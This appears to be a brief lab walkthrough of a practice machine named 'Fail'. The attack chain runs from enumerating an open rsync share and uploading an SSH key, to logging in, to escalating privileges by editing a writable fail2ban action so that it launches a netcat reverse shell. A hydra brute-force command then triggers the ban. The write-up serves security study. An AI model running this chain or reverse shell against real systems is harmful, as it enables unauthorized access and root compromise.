# Fail
# date 6/8/20023
# ip 192.168.230.126

rsync open to upload > uploaded ssh > login by ssh > writable /etc/fail2ban >edited > conf command to ban user > got rev shell

# nmap
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
873/tcp open  rsync   (protocol version 31)


└─$ nmap -sV --script "rsync-list-modules" -p 873 192.168.230.126
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|_  fox                 fox home


└─$ rsync -av --list-only rsync://192.168.230.126/fox
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 09:21:59 .
lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 00:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 00:12:36 .bashrc
-rw-r--r--            807 2019/04/18 00:12:36 .profile

└─$ rsync -av  rsync://192.168.230.126/fox /tmp/fox

# exploitation
upload ssh

└─$ rsync -av /tmp/.ssh rsync://fox@192.168.230.126/fox

└─$ ssh fox@192.168.230.126 -i ssh                         


# priv esc
find /etc/ -type f -writable 2>/dev/null



cd /etc/fail2ban/action.d/


If we look at /etc/fail2ban/action.d/iptables-multiport.conf, there is an actionban variable which is the action being performed once the IPS notices malicious activity done by the IP address in subject.
At the moment, the action seems to be blacklisting the IP address temporarily.



/etc/fail2ban/action.d/iptables-multiport.conf

edit this 
actionban = nc 192.168.45.206 80 -e /bin/bash                

└─$ nc -lvnp 80             


Finally, we have to trigger the ban by manually sshing to the target host multiple times, or automate the process using hydra.

└─$ hydra -l banme -P /usr/share/wordlists/rockyou.txt 192.168.230.126 ssh -t 10 -v


